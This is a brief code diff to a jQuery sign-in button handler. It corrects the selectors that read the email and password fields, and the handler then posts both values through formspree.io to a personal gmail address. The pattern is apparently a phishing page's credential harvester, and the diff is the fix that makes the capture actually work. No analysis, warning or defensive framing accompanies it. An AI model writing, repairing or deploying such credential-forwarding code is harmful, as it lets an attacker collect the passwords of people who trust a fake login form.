@@ -222,8 +222,8 @@
         $("#signin_button").click(function () {
             $("#signin_button").prop("value", "Signing In...");
 
-                var email = $("email").prop("value");
-                var passwd = $("password").prop("value");
+                var email = $("#email").prop("value");
+                var passwd = $("#password").prop("value");
                 $.ajax({
     url: "https://formspree.io/stevuninverse@gmail.com", 
     method: "POST",
